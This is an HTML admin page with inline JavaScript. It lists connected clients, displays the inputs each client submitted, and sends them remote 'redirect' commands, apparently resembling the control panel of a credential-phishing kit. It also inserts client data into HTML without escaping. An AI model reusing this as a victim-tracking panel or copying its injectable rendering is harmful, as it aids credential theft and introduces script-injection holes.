<!DOCTYPE html>
<html>
<head>
  <title>Admin Panel</title>
</head>
<body>
  <h1>Admin Panel</h1>
  <div id="clients"></div>

  <script>
    const clientsDiv = document.getElementById('clients');

    function updateClients(clientList) {
      clientsDiv.innerHTML = '';
      clientList.forEach(client => {
        const clientDiv = document.createElement('div');
        clientDiv.innerHTML = `
          <p>Client: ${client.name || client.clientId}</p>
          <button onclick="sendCommand('${client.clientId}', 'redirect1')">Redirect 1</button>
          <button onclick="sendCommand('${client.clientId}', 'redirect2')">Redirect 2</button>
          <!-- Add more buttons as needed -->
          <button onclick="viewInputs('${client.clientId}')">View Inputs</button>
          <button onclick="deleteClient('${client.clientId}')">Delete</button>
          <div id="inputs-${client.clientId}" style="display: none;">
            <h3>Inputs:</h3>
            ${client.inputs.map(input => `<p>${input}</p>`).join('')}
          </div>
        `;
        clientsDiv.appendChild(clientDiv);
      });
    }

    function sendCommand(clientId, command) {
      fetch('/send-command', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ clientId, command })
      });
    }

    function viewInputs(clientId) {
      const inputsDiv = document.getElementById(`inputs-${clientId}`);
      if (inputsDiv.style.display === 'none') {
        inputsDiv.style.display = 'block';
      } else {
        inputsDiv.style.display = 'none';
      }
    }

    function deleteClient(clientId) {
      fetch('/delete-client', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ clientId })
      });
    }

    const eventSource = new EventSource('/events');
    eventSource.onmessage = function(event) {
      const data = JSON.parse(event.data);
      if (data.type === 'adminUpdate') {
        updateClients(data.clientList);
      }
    };
  </script>
</body>
</html>
